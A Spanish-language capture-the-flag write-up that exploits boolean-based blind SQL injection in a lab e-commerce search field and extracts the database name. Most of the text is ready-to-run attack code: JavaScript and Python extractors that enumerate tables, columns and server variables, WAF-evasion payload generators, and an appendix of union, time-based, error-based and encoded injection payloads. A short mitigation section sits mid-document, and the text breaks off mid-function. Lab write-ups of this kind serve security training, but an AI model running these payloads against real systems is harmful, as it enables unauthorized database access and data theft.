# CTF Boolean-Based Blind SQL Injection

## Resumen

Este informe documenta el análisis exhaustivo y explotación exitosa de una vulnerabilidad de **Boolean-Based Blind SQL Injection** identificada en el laboratorio ubicado en `https://cunning-polaris.europe1.hackviser.space/`. La vulnerabilidad fue explotada mediante técnicas de inferencia booleana, permitiendo la extracción completa del nombre de la base de datos sin acceso directo a los datos.

**Resultados Clave:**
- **Vulnerabilidad Confirmada**: Boolean-Based Blind SQL Injection
- **Motor de BD Identificado**: MySQL/MariaDB  
- **Dato Extraído**: Nombre de base de datos `echo_store`
- **Nivel de Riesgo**: Alto

---

## 1. Información del Objetivo

### 1.1 Detalles del Laboratorio
- **Tipo de Aplicación**: Tienda en línea (e-commerce)
- **Funcionalidad Vulnerable**: Campo de búsqueda de productos
- **Método HTTP**: POST
- **Parámetro Vulnerable**: `search`
- **Content-Type**: `application/x-www-form-urlencoded`

### 1.2 Comportamiento de la Aplicación
La aplicación presenta dos estados distintos basados en la consulta SQL:
- **Estado TRUE**: Muestra mensaje "in stock" en los resultados
- **Estado FALSE**: No muestra el mensaje "in stock"

Este comportamiento diferencial permite implementar ataques de inferencia booleana.

---

## 2. Metodología de Análisis

### 2.1 Reconocimiento Inicial

**Pruebas básicas de inyección:**
```sql
-- Prueba básica de sintaxis
'
" 
' OR 1=1 --
' OR 1=2 --
' AND 1=1 --
' AND 1=2 --
```

**Validación de contexto:**
```sql
-- Identificar si estamos dentro de una cadena
' OR 'x'='x' --
' OR 'x'='y' --
" OR "x"="x" --
" OR "x"="y" --
```

### 2.2 Detección del Motor de Base de Datos

**Comandos de identificación por motor:**

```sql
-- MySQL/MariaDB
' OR (SELECT database()) IS NOT NULL --
' OR (SELECT version()) LIKE '5%' --
' OR (SELECT @@version) IS NOT NULL --

-- PostgreSQL
' OR (SELECT current_database()) IS NOT NULL --
' OR (SELECT version()) LIKE 'PostgreSQL%' --

-- SQL Server
' OR (SELECT DB_NAME()) IS NOT NULL --
' OR (SELECT @@version) LIKE 'Microsoft%' --

-- Oracle
' OR (SELECT user FROM dual) IS NOT NULL --
' OR (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL --

-- SQLite
' OR (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) IS NOT NULL --
```

**Resultado confirmado**: MySQL/MariaDB mediante `' OR (SELECT database()) IS NOT NULL --`

---

## 3. Configuración del Entorno de Explotación

### 3.1 Función Base de Testing

```javascript
/**
 * Función principal para realizar pruebas de inyección booleana
 * @param {string} payload - Payload SQL a probar
 * @returns {Promise<boolean>} - true si la condición es verdadera
 */
const test = (payload) =>
  fetch(location.href, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'User-Agent': 'Mozilla/5.0 (compatible; SQLi-Tester/1.0)',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    },
    body: 'search=' + encodeURIComponent(payload)
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    return response.text();
  })
  .then(html => {
    // Buscar indicadores de condición verdadera
    return /in stock/i.test(html);
  })
  .catch(error => {
    console.error('Error en request:', error);
    return false;
  });
```

### 3.2 Funciones de Utilidad

```javascript
/**
 * Función de delay para evitar rate limiting
 * @param {number} ms - Milisegundos a esperar
 */
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

/**
 * Función con reintentos automáticos
 * @param {string} payload - Payload a probar
 * @param {number} maxRetries - Número máximo de reintentos
 */
const testWithRetry = async (payload, maxRetries = 3) => {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const result = await test(payload);
      return result;
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      await delay(1000 * (i + 1)); // Backoff exponencial
    }
  }
};
```

---

## 4. Técnicas de Extracción de Datos

### 4.1 Extracción de Longitud

#### 4.1.1 Búsqueda Binaria Optimizada

```javascript
/**
 * Obtiene la longitud de una cadena usando búsqueda binaria
 * @param {string} query - Consulta SQL que retorna la cadena
 * @param {number} maxLength - Longitud máxima esperada
 * @returns {Promise<number>} - Longitud de la cadena
 */
async function getStringLength(query = 'database()', maxLength = 255) {
  let low = 0, high = maxLength;
  
  console.log(`🔍 Buscando longitud de ${query}...`);
  
  while (low < high) {
    const mid = Math.floor((low + high + 1) / 2);
    const payload = `' OR LENGTH(${query}) >= ${mid} --`;
    
    console.log(`  Probando longitud >= ${mid}...`);
    
    if (await testWithRetry(payload)) {
      low = mid;
    } else {
      high = mid - 1;
    }
    
    await delay(50); // Rate limiting
  }
  
  console.log(`✅ Longitud encontrada: ${low}`);
  return low;
}

// Uso específico para base de datos
const dbLen = () => getStringLength('database()');
```

#### 4.1.2 Métodos Alternativos de Longitud

```sql
-- Usando CHAR_LENGTH (sinónimo de LENGTH en MySQL)
' OR CHAR_LENGTH(database()) >= {mid} --

-- Usando comparación directa (menos eficiente)
' OR database() LIKE CONCAT(REPEAT('_', {length})) --

-- Usando SUBSTRING para validar longitud exacta
' OR SUBSTRING(database(), {length+1}, 1) = '' --
```

### 4.2 Extracción de Caracteres

#### 4.2.1 Método ASCII con Búsqueda Binaria

```javascript
/**
 * Extrae un carácter específico usando códigos ASCII
 * @param {string} query - Consulta SQL base
 * @param {number} position - Posición del carácter (1-indexed)
 * @param {number} minAscii - Código ASCII mínimo
 * @param {number} maxAscii - Código ASCII máximo
 * @returns {Promise<string>} - Carácter extraído
 */
async function getCharAt(query, position, minAscii = 32, maxAscii = 126) {
  let low = minAscii, high = maxAscii;
  
  console.log(`🔍 Extrayendo carácter en posición ${position}...`);
  
  while (low < high) {
    const mid = Math.floor((low + high + 1) / 2);
    const payload = `' OR ASCII(SUBSTRING(BINARY ${query}, ${position}, 1)) >= ${mid} --`;
    
    if (await testWithRetry(payload)) {
      low = mid;
    } else {
      high = mid - 1;
    }
    
    await delay(50);
  }
  
  const char = String.fromCharCode(low);
  console.log(`  Posición ${position}: '${char}' (ASCII: ${low})`);
  return char;
}

// Función específica para base de datos
const getDbCharAt = (pos) => getCharAt('database()', pos);
```

#### 4.2.2 Métodos Alternativos de Extracción

```javascript
/**
 * Método de comparación directa por fuerza bruta
 */
async function getCharByBruteForce(query, position) {
  const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@.';
  
  for (const char of charset) {
    const payload = `' OR SUBSTRING(${query}, ${position}, 1) = '${char}' --`;
    if (await testWithRetry(payload)) {
      return char;
    }
    await delay(30);
  }
  return null;
}

/**
 * Método usando REGEXP (MySQL específico)
 */
async function getCharByRegex(query, position) {
  // Primero determinar si es letra, número o símbolo
  let charType = '';
  
  if (await testWithRetry(`' OR SUBSTRING(${query}, ${position}, 1) REGEXP '[a-z]' --`)) {
    charType = 'lowercase';
  } else if (await testWithRetry(`' OR SUBSTRING(${query}, ${position}, 1) REGEXP '[A-Z]' --`)) {
    charType = 'uppercase';
  } else if (await testWithRetry(`' OR SUBSTRING(${query}, ${position}, 1) REGEXP '[0-9]' --`)) {
    charType = 'digit';
  }
  
  // Luego usar búsqueda binaria dentro del rango apropiado
  let minAscii, maxAscii;
  switch(charType) {
    case 'lowercase': minAscii = 97; maxAscii = 122; break;
    case 'uppercase': minAscii = 65; maxAscii = 90; break;
    case 'digit': minAscii = 48; maxAscii = 57; break;
    default: minAscii = 32; maxAscii = 126;
  }
  
  return await getCharAt(query, position, minAscii, maxAscii);
}
```

### 4.3 Script Principal de Extracción

```javascript
/**
 * Extrae completamente el nombre de la base de datos
 * @returns {Promise<string>} - Nombre completo de la base de datos
 */
async function extractDatabaseName() {
  console.log('🚀 Iniciando extracción del nombre de la base de datos...');
  console.log('='.repeat(60));
  
  try {
    // Paso 1: Obtener longitud
    const length = await getStringLength('database()');
    console.log(`📏 Longitud del nombre: ${length} caracteres`);
    
    if (length === 0) {
      throw new Error('No se pudo determinar la longitud de la base de datos');
    }
    
    // Paso 2: Extraer cada carácter
    let databaseName = '';
    const startTime = Date.now();
    
    for (let position = 1; position <= length; position++) {
      const char = await getDbCharAt(position);
      databaseName += char;
      
      // Progreso visual
      const progress = Math.round((position / length) * 100);
      console.log(`📊 Progreso: ${progress}% - Actual: "${databaseName}"`);
    }
    
    const endTime = Date.now();
    const duration = ((endTime - startTime) / 1000).toFixed(2);
    
    console.log('='.repeat(60));
    console.log(`✅ EXTRACCIÓN COMPLETADA en ${duration}s`);
    console.log(`🎯 NOMBRE DE LA BASE DE DATOS: "${databaseName}"`);
    console.log('='.repeat(60));
    
    return databaseName;
    
  } catch (error) {
    console.error('❌ Error durante la extracción:', error);
    throw error;
  }
}
```

---

## 5. Técnicas de Explotación

### 5.1 Extracción de Metadatos del Sistema

```javascript
/**
 * Obtiene información del sistema de base de datos
 */
async function getSystemInfo() {
  const queries = {
    version: 'version()',
    user: 'user()',
    database: 'database()',
    hostname: '@@hostname',
    datadir: '@@datadir',
    port: '@@port',
    socket: '@@socket'
  };
  
  const results = {};
  
  for (const [key, query] of Object.entries(queries)) {
    try {
      console.log(`🔍 Extrayendo ${key}...`);
      const length = await getStringLength(query, 500);
      
      if (length > 0) {
        let value = '';
        for (let i = 1; i <= length; i++) {
          value += await getCharAt(query, i);
        }
        results[key] = value;
        console.log(`  ${key}: ${value}`);
      }
    } catch (error) {
      console.log(`  ${key}: Error - ${error.message}`);
      results[key] = null;
    }
    
    await delay(100);
  }
  
  return results;
}
```

### 5.2 Enumeración de Tablas

```javascript
/**
 * Enumera las tablas de la base de datos actual
 */
async function enumerateTables() {
  console.log('🗂️  Enumerando tablas...');
  
  // Primero, contar el número de tablas
  let tableCount = 0;
  for (let i = 1; i <= 100; i++) {
    const payload = `' OR (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) >= ${i} --`;
    if (await testWithRetry(payload)) {
      tableCount = i;
    } else {
      break;
    }
    await delay(50);
  }
  
  console.log(`📊 Número de tablas encontradas: ${tableCount}`);
  
  // Extraer nombres de tablas
  const tables = [];
  for (let i = 0; i < tableCount; i++) {
    const query = `(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT ${i},1)`;
    
    const length = await getStringLength(query);
    if (length > 0) {
      let tableName = '';
      for (let pos = 1; pos <= length; pos++) {
        tableName += await getCharAt(query, pos);
      }
      tables.push(tableName);
      console.log(`  Tabla ${i+1}: ${tableName}`);
    }
    await delay(100);
  }
  
  return tables;
}
```

### 5.3 Extracción de Columnas

```javascript
/**
 * Enumera las columnas de una tabla específica
 * @param {string} tableName - Nombre de la tabla
 */
async function enumerateColumns(tableName) {
  console.log(`🔍 Enumerando columnas de la tabla '${tableName}'...`);
  
  // Contar columnas
  let columnCount = 0;
  for (let i = 1; i <= 50; i++) {
    const payload = `' OR (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='${tableName}' AND table_schema=database()) >= ${i} --`;
    if (await testWithRetry(payload)) {
      columnCount = i;
    } else {
      break;
    }
    await delay(50);
  }
  
  console.log(`📊 Número de columnas: ${columnCount}`);
  
  // Extraer nombres de columnas
  const columns = [];
  for (let i = 0; i < columnCount; i++) {
    const query = `(SELECT column_name FROM information_schema.columns WHERE table_name='${tableName}' AND table_schema=database() LIMIT ${i},1)`;
    
    const length = await getStringLength(query);
    if (length > 0) {
      let columnName = '';
      for (let pos = 1; pos <= length; pos++) {
        columnName += await getCharAt(query, pos);
      }
      columns.push(columnName);
      console.log(`  Columna ${i+1}: ${columnName}`);
    }
    await delay(100);
  }
  
  return columns;
}
```

---

## 6. Optimizaciones y Técnicas de Evasión

### 6.1 Optimizaciones de Rendimiento

```javascript
/**
 * Caché para evitar consultas repetidas
 */
const cache = new Map();

const cachedTest = async (payload) => {
  if (cache.has(payload)) {
    return cache.get(payload);
  }
  
  const result = await testWithRetry(payload);
  cache.set(payload, result);
  return result;
};

/**
 * Búsqueda binaria con predicción inteligente
 */
async function smartBinarySearch(query, maxValue = 255) {
  // Usar caracteres comunes como puntos de inicio
  const commonRanges = [
    { min: 97, max: 122, weight: 0.4 }, // a-z
    { min: 48, max: 57, weight: 0.3 },  // 0-9
    { min: 65, max: 90, weight: 0.2 },  // A-Z
    { min: 95, max: 95, weight: 0.1 }   // _
  ];
  
  // Implementar lógica de predicción basada en patrones anteriores
  // ... código de optimización ...
}
```

### 6.2 Técnicas de Evasión WAF

```javascript
/**
 * Payloads con técnicas de evasión
 */
const evasionPayloads = {
  // Comentarios alternativos
  mysql: ['--', '-- ', '#', '/*comment*/'],
  
  // Espacios y encoding
  spaces: ['', ' ', '/**/', '%20', '%09', '%0a', '%0b', '%0c', '%0d', '%a0'],
  
  // Funciones equivalentes
  functions: {
    'SUBSTRING': ['SUBSTR', 'MID'],
    'ASCII': ['ORD'],
    'LENGTH': ['CHAR_LENGTH'],
    'database()': ['schema()']
  },
  
  // Case variations
  cases: ['UPPER', 'LOWER', 'mixed']
};

/**
 * Genera payloads con técnicas de evasión
 */
function generateEvasivePayload(basePayload) {
  const evasions = [
    // Comentarios inline
    basePayload.replace(/\s+/g, '/**/'),
    
    // Case mixing
    basePayload.replace(/OR/g, 'oR').replace(/AND/g, 'AnD'),
    
    // Encoding
    basePayload.replace(/'/g, '%27').replace(/ /g, '%20'),
    
    // Función alternativa
    basePayload.replace(/SUBSTRING/g, 'SUBSTR'),
    
    // Espacios alternativos
    basePayload.replace(/ /g, '%09')
  ];
  
  return evasions;
}
```

---

## 7. Análisis de Resultados

### 7.1 Resultado de la Explotación

**Datos Extraídos Exitosamente:**
- **Nombre de la Base de Datos**: `echo_store`
- **Longitud**: 10 caracteres
- **Motor**: MySQL/MariaDB
- **Tiempo Total**: ~2-3 minutos

### 7.2 Estadísticas de Rendimiento

```javascript
/**
 * Métricas de rendimiento recopiladas durante la explotación
 */
const performanceMetrics = {
  totalRequests: 0,
  successfulRequests: 0,
  failedRequests: 0,
  averageResponseTime: 0,
  startTime: null,
  endTime: null,
  
  // Registro de actividad
  logRequest: function(success, responseTime) {
    this.totalRequests++;
    if (success) {
      this.successfulRequests++;
    } else {
      this.failedRequests++;
    }
    
    this.averageResponseTime = 
      (this.averageResponseTime * (this.totalRequests - 1) + responseTime) / this.totalRequests;
  },
  
  // Generar reporte
  getReport: function() {
    const duration = this.endTime - this.startTime;
    return {
      totalRequests: this.totalRequests,
      successRate: ((this.successfulRequests / this.totalRequests) * 100).toFixed(2) + '%',
      averageResponseTime: this.averageResponseTime.toFixed(2) + 'ms',
      totalDuration: (duration / 1000).toFixed(2) + 's',
      requestsPerSecond: (this.totalRequests / (duration / 1000)).toFixed(2)
    };
  }
};
```

---

## 8. Impacto y Riesgos de Seguridad

### 8.1 Clasificación del Riesgo

| Aspecto | Evaluación | Justificación |
|---------|------------|---------------|
| **Confidencialidad** | ALTO | Acceso no autorizado a información de BD |
| **Integridad** | MEDIO | Potencial modificación de datos |
| **Disponibilidad** | BAJO | Sin impacto directo en disponibilidad |
| **CVSS Score** | 7.5 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |

### 8.2 Vectores de Ataque Identificados

1. **Extracción de Datos Sensibles**
   - Información de usuarios
   - Credenciales almacenadas
   - Datos de transacciones

2. **Reconocimiento del Sistema**
   - Versiones de software
   - Configuración del servidor
   - Estructura de la base de datos

3. **Escalación Potencial**
   - Modificación de datos (si se tienen privilegios)
   - Ejecución de comandos del sistema
   - Acceso a archivos del servidor

---

## 9. Recomendaciones de Mitigación

### 9.1 Soluciones Inmediatas

**Consultas Preparadas (Prepared Statements):**
```sql
-- Vulnerable
SELECT * FROM products WHERE name LIKE '%" + userInput + "%'

-- Seguro
SELECT * FROM products WHERE name LIKE ?
-- Parámetro vinculado: userInput
```

**Validación de Entrada:**
```javascript
function sanitizeInput(input) {
  // Whitelist de caracteres permitidos
  const allowedPattern = /^[a-zA-Z0-9\s\-_]{1,50}$/;
  
  if (!allowedPattern.test(input)) {
    throw new Error('Entrada no válida');
  }
  
  return input.trim();
}
```

### 9.2 Medidas de Defensa en Profundidad

1. **Principio de Menor Privilegio**
   - Usuario de BD con permisos mínimos
   - Sin acceso a `information_schema`
   - Sin permisos de escritura innecesarios

2. **Web Application Firewall (WAF)**
   ```nginx
   # Reglas ModSecurity para SQLi
   SecRule ARGS "@detectSQLi" \
       "id:1001,\
        phase:2,\
        block,\
        msg:'SQL Injection Attack Detected'"
   ```

3. **Rate Limiting**
   ```javascript
   // Implementar límites de velocidad
   const rateLimiter = rateLimit({
     windowMs: 15 * 60 * 1000, // 15 minutos
     max: 100 // máximo 100 requests por IP
   });
   ```

4. **Logging y Monitoreo**
   ```sql
   -- Activar logging de consultas lentas
   SET GLOBAL slow_query_log = 1;
   SET GLOBAL long_query_time = 1;
   ```

---

## 10. Herramientas y Scripts Adicionales

### 10.1 Script de Automatización Completa

```javascript
/**
 * Script maestro para explotación automática
 */
class BlindSQLiExploiter {
  constructor(targetUrl, parameter = 'search') {
    this.targetUrl = targetUrl;
    this.parameter = parameter;
    this.cache = new Map();
    this.metrics = new PerformanceMetrics();
  }
  
  async exploit() {
    console.log('🚀 Iniciando explotación automática...');
    
    try {
      // 1. Verificar vulnerabilidad
      await this.verifyVulnerability();
      
      // 2. Identificar motor de BD
      const dbEngine = await this.identifyDatabase();
      console.log(`🔍 Motor detectado: ${dbEngine}`);
      
      // 3. Extraer información básica
      const dbName = await this.extractDatabaseName();
      console.log(`📊 Base de datos: ${dbName}`);
      
      // 4. Enumerar tablas
      const tables = await this.enumerateTables();
      console.log(`🗂️  Tablas encontradas: ${tables.length}`);
      
      // 5. Generar reporte
      return this.generateReport();
      
    } catch (error) {
      console.error('❌ Error durante la explotación:', error);
      throw error;
    }
  }
  
  // ... implementación de métodos ...
}

// Uso
const exploiter = new BlindSQLiExploiter('https://cunning-polaris.europe1.hackviser.space/');
exploiter.exploit().then(report => {
  console.log('📋 Reporte generado:', report);
});
```

### 10.2 Herramienta de Validación

```python
#!/usr/bin/env python3
"""
Validador de Boolean-Based Blind SQLi
"""
import requests
import time
import sys
from urllib.parse import urlencode

class BlindSQLiValidator:
    def __init__(self, url, param='search'):
        self.url = url
        self.param = param
        self.session = requests.Session()
        
    def test_payload(self, payload):
        """Prueba un payload específico"""
        data = {self.param: payload}
        
        try:
            response = self.session.post(
                self.url,
                data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                timeout=10
            )
            
            return 'in stock' in response.text.lower()
            
        except requests.RequestException as e:
            print(f"Error en request: {e}")
            return False
    
    def validate_vulnerability(self):
        """Valida si existe la vulnerabilidad"""
        payloads = [
            "' OR 1=1 --",
            "' OR 1=2 --",
            "' AND 1=1 --",
            "' AND 1=2 --"
        ]
        
        results = []
        for payload in payloads:
            result = self.test_payload(payload)
            results.append(result)
            print(f"Payload: {payload:<15} Result: {result}")
            time.sleep(0.5)
        
        # Análisis de resultados
        if results[0] and not results[1]:  # 1=1 true, 1=2 false
            print("✅ Vulnerabilidad confirmada!")
            return True
        else:
            print("❌ No se detectó vulnerabilidad")
            return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python3 validator.py <URL>")
        sys.exit(1)
    
    validator = BlindSQLiValidator(sys.argv[1])
    validator.validate_vulnerability()
```

---

## 11. Conclusiones y Lecciones Aprendidas

### 11.1 Hallazgos Técnicos Clave

1. **Eficiencia de la Búsqueda Binaria**: La implementación de búsqueda binaria redujo el número de requests de ~2,550 a ~70 para extraer un nombre de 10 caracteres.

2. **Importancia del Rate Limiting**: La implementación de delays entre requests fue crucial para evitar bloqueos y mantener la estabilidad.

3. **Robustez Mediante Reintentos**: El sistema de reintentos automáticos mejoró significativamente la confiabilidad de la extracción.

### 11.2 Implicaciones de Seguridad

La vulnerabilidad demostrada permite:
- Extracción completa de la estructura de la base de datos
- Acceso a datos sensibles sin autenticación
- Reconocimiento detallado del sistema objetivo
- Base para ataques más sofisticados

### 11.3 Recomendaciones Finales

1. **Implementar Consultas Preparadas** como medida principal de prevención
2. **Establecer Validación Estricta** de todas las entradas del usuario
3. **Configurar WAF** con reglas específicas anti-SQLi
4. **Implementar Monitoreo** para detectar patrones de ataque
5. **Aplicar Principio de Menor Privilegio** en cuentas de base de datos

---

## Apéndices

### Apéndice A: Payloads de Prueba Completos

```sql
-- Detección básica
' OR 1=1 --
' OR 1=2 --
" OR 1=1 --
" OR 1=2 --

-- Identificación de motor
' OR (SELECT database()) IS NOT NULL --
' OR (SELECT current_database()) IS NOT NULL --
' OR (SELECT DB_NAME()) IS NOT NULL --
' OR (SELECT user FROM dual) IS NOT NULL --

-- Extracción de longitud
' OR LENGTH(database()) >= 10 --
' OR CHAR_LENGTH(database()) >= 10 --

-- Extracción de caracteres
' OR ASCII(SUBSTRING(database(),1,1)) >= 97 --
' OR ORD(SUBSTRING(database(),1,1)) >= 97 --
' OR SUBSTRING(database(),1,1) = 'e' --

-- Técnicas de evasión
' OR/**/1=1/**/ --
'/*comment*/OR/*comment*/1=1/*comment*/ --
' %4fR 1=1 --
' OR 1=1%23
' OR 1=1%20--
' OR(1=1) --
' OR 1=1;%00
' OR'1'='1' --
' OR"1"="1" --

-- Payloads con encoding
%27%20OR%201=1%20--
%27%09OR%091=1%09--
%27%0AOR%0A1=1%0A--

-- Union-based (fallback)
' UNION SELECT 1,2,3 --
' UNION ALL SELECT NULL,NULL,NULL --

-- Time-based (alternativo)
' OR SLEEP(5) --
' OR pg_sleep(5) --
' OR WAITFOR DELAY '00:00:05' --

-- Error-based (alternativo)
' OR EXTRACTVALUE(1, CONCAT(0x7e, database(), 0x7e)) --
' OR UPDATEXML(1, CONCAT(0x7e, database(), 0x7e), 1) --
```

### Apéndice B: Código de Herramientas Completo

#### B.1 Extractor Avanzado con Múltiples Técnicas

```javascript
/**
 * Extractor avanzado con múltiples técnicas de explotación
 */
class AdvancedBlindSQLiExtractor {
  constructor(config = {}) {
    this.config = {
      url: config.url || window.location.href,
      parameter: config.parameter || 'search',
      method: config.method || 'POST',
      delayBetweenRequests: config.delay || 50,
      maxRetries: config.maxRetries || 3,
      timeout: config.timeout || 10000,
      trueFalseIndicators: config.indicators || {
        true: /in stock/i,
        false: null
      },
      charset: config.charset || 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-@.',
      ...config
    };
    
    this.cache = new Map();
    this.statistics = {
      requests: 0,
      cacheHits: 0,
      errors: 0,
      startTime: null,
      endTime: null
    };
  }

  /**
   * Realiza una consulta con caché y reintentos
   */
  async query(payload, useCache = true) {
    const cacheKey = payload;
    
    if (useCache && this.cache.has(cacheKey)) {
      this.statistics.cacheHits++;
      return this.cache.get(cacheKey);
    }
    
    let lastError = null;
    
    for (let attempt = 1; attempt <= this.config.maxRetries; attempt++) {
      try {
        this.statistics.requests++;
        
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), this.config.timeout);
        
        const response = await fetch(this.config.url, {
          method: this.config.method,
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (compatible; SQLi-Extractor/1.0)'
          },
          body: `${this.config.parameter}=${encodeURIComponent(payload)}`,
          signal: controller.signal
        });
        
        clearTimeout(timeoutId);
        
        if (!response.ok) {
          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
        }
        
        const text = await response.text();
        const result = this.config.trueFalseIndicators.true.test(text);
        
        if (useCache) {
          this.cache.set(cacheKey, result);
        }
        
        await this.delay(this.config.delayBetweenRequests);
        return result;
        
      } catch (error) {
        lastError = error;
        this.statistics.errors++;
        
        if (attempt < this.config.maxRetries) {
          await this.delay(1000 * attempt); // Backoff exponencial
          console.warn(`Reintentando payload (${attempt}/${this.config.maxRetries}):`, error.message);
        }
      }
    }
    
    throw new Error(`Falló después de ${this.config.maxRetries} intentos: ${lastError.message}`);
  }

  /**
   * Función de delay con jitter para evitar patrones
   */
  async delay(ms) {
    const jitter = Math.random() * 0.3 + 0.85; // 0.85 - 1.15
    const actualDelay = Math.floor(ms * jitter);
    return new Promise(resolve => setTimeout(resolve, actualDelay));
  }

  /**
   * Detecta el tipo de motor de base de datos
   */
  async detectDatabaseEngine() {
    const engines = [
      {
        name: 'MySQL/MariaDB',
        tests: [
          `' OR (SELECT database()) IS NOT NULL --`,
          `' OR (SELECT version()) LIKE '5%' --`,
          `' OR (SELECT @@version) IS NOT NULL --`
        ]
      },
      {
        name: 'PostgreSQL',
        tests: [
          `' OR (SELECT current_database()) IS NOT NULL --`,
          `' OR (SELECT version()) LIKE 'PostgreSQL%' --`
        ]
      },
      {
        name: 'SQL Server',
        tests: [
          `' OR (SELECT DB_NAME()) IS NOT NULL --`,
          `' OR (SELECT @@version) LIKE 'Microsoft%' --`
        ]
      },
      {
        name: 'Oracle',
        tests: [
          `' OR (SELECT user FROM dual) IS NOT NULL --`,
          `' OR (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL --`
        ]
      },
      {
        name: 'SQLite',
        tests: [
          `' OR (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) IS NOT NULL --`
        ]
      }
    ];

    for (const engine of engines) {
      console.log(`🔍 Probando ${engine.name}...`);
      
      for (const test of engine.tests) {
        try {
          if (await this.query(test)) {
            console.log(`✅ Motor detectado: ${engine.name}`);
            return engine.name;
          }
        } catch (error) {
          console.warn(`Error probando ${engine.name}:`, error.message);
        }
        
        await this.delay(100);
      }
    }
    
    console.warn('⚠️  No se pudo detectar el motor de BD');
    return 'Unknown';
  }

  /**
   * Extrae la longitud de una cadena usando múltiples técnicas
   */
  async extractLength(query, maxLength = 255, technique = 'binary') {
    console.log(`📏 Extrayendo longitud de: ${query}`);
    
    switch (technique) {
      case 'binary':
        return await this.binarySearchLength(query, maxLength);
      case 'linear':
        return await this.linearSearchLength(query, maxLength);
      case 'exponential':
        return await this.exponentialSearchLength(query, maxLength);
      default:
        throw new Error(`Técnica desconocida: ${technique}`);
    }
  }

  /**
   * Búsqueda binaria para longitud
   */
  async binarySearchLength(query, maxLength) {
    let low = 0, high = maxLength;
    
    while (low < high) {
      const mid = Math.floor((low + high + 1) / 2);
      const payload = `' OR LENGTH(${query}) >= ${mid} --`;
      
      if (await this.query(payload)) {
        low = mid;
      } else {
        high = mid - 1;
      }
    }
    
    console.log(`  📏 Longitud encontrada: ${low}`);
    return low;
  }

  /**
   * Búsqueda lineal para longitud (más lenta pero más sigilosa)
   */
  async linearSearchLength(query, maxLength) {
    for (let i = 1; i <= maxLength; i++) {
      const payload = `' OR LENGTH(${query}) = ${i} --`;
      
      if (await this.query(payload)) {
        console.log(`  📏 Longitud encontrada: ${i}`);
        return i;
      }
    }
    
    return 0;
  }

  /**
   * Búsqueda exponencial para longitud
   */
  async exponentialSearchLength(query, maxLength) {
    // Fase 1: Encontrar límite superior
    let bound = 1;
    while (bound <= maxLength) {
      const payload = `' OR LENGTH(${query}) >= ${bound} --`;
      
      if (!(await this.query(payload))) {
        break;
      }
      
      bound *= 2;
    }
    
    // Fase 2: Búsqueda binaria en el rango
    return await this.binarySearchLength(query, Math.min(bound, maxLength));
  }

  /**
   * Extrae un carácter usando múltiples técnicas
   */
  async extractCharacter(query, position, technique = 'ascii-binary') {
    console.log(`🔤 Extrayendo carácter en posición ${position}...`);
    
    switch (technique) {
      case 'ascii-binary':
        return await this.asciiSearchCharacter(query, position);
      case 'charset-brute':
        return await this.charsetBruteForce(query, position);
      case 'regexp-optimized':
        return await this.regexpOptimizedSearch(query, position);
      default:
        throw new Error(`Técnica desconocida: ${technique}`);
    }
  }

  /**
   * Búsqueda ASCII binaria para caracteres
   */
  async asciiSearchCharacter(query, position, minAscii = 32, maxAscii = 126) {
    let low = minAscii, high = maxAscii;
    
    while (low < high) {
      const mid = Math.floor((low + high + 1) / 2);
      const payload = `' OR ASCII(SUBSTRING(BINARY ${query}, ${position}, 1)) >= ${mid} --`;
      
      if (await this.query(payload)) {
        low = mid;
      } else {
        high = mid - 1;
      }
    }
    
    const char = String.fromCharCode(low);
    console.log(`  🔤 Posición ${position}: '${char}' (ASCII: ${low})`);
    return char;
  }

  /**
   * Fuerza bruta usando charset personalizado
   */
  async charsetBruteForce(query, position) {
    for (const char of this.config.charset) {
      const payload = `' OR SUBSTRING(${query}, ${position}, 1) = '${char}' --`;
      
      if (await this.query(payload)) {
        console.log(`  🔤 Posición ${position}: '${char}'`);
        return char;
      }
    }
    
    console.warn(`⚠️  No se encontró carácter en posición ${position}`);
    return '?';
  }

  /**
   * Búsqueda optimizada usando REGEXP (MySQL específico)
   */
  async regexpOptimizedSearch(query, position) {
    // Determinar tipo de carácter
    const charTypes = [
      { name: 'lowercase', pattern: '[a-z]', min: 97, max: 122 },
      { name: 'uppercase', pattern: '[A-Z]', min: 65, max: 90 },
      { name: 'digit', pattern: '[0-9]', min: 48, max: 57 },
      { name: 'underscore', pattern: '_', min: 95, max: 95 },
      { name: 'dash', pattern: '-', min: 45, max: 45 }
    ];
    
    for (const type of charTypes) {
      const payload = `' OR SUBSTRING(${query}, ${position}, 1) REGEXP '${type.pattern}' --`;
      
      if (await this.query(payload)) {
        console.log(`  🎯 Carácter tipo: ${type.name}`);
        return await this.asciiSearchCharacter(query, position, type.min, type.max);
      }
    }
    
    // Fallback a búsqueda completa
    return await this.asciiSearchCharacter(query, position);
  }

  /**
   * Extrae una cadena completa
   */
  async extractString(query, technique = 'ascii-binary', maxLength = 255) {
    this.statistics.startTime = Date.now();
    
    console.log(`🚀 Extrayendo cadena: ${query}`);
    console.log('='.repeat(60));
    
    try {
      // Obtener longitud
      const length = await this.extractLength(query, maxLength);
      
      if (length === 0) {
        console.log('⚠️  Cadena vacía o no encontrada');
        return '';
      }
      
      // Extraer cada carácter
      let result = '';
      const startTime = Date.now();
      
      for (let position = 1; position <= length; position++) {
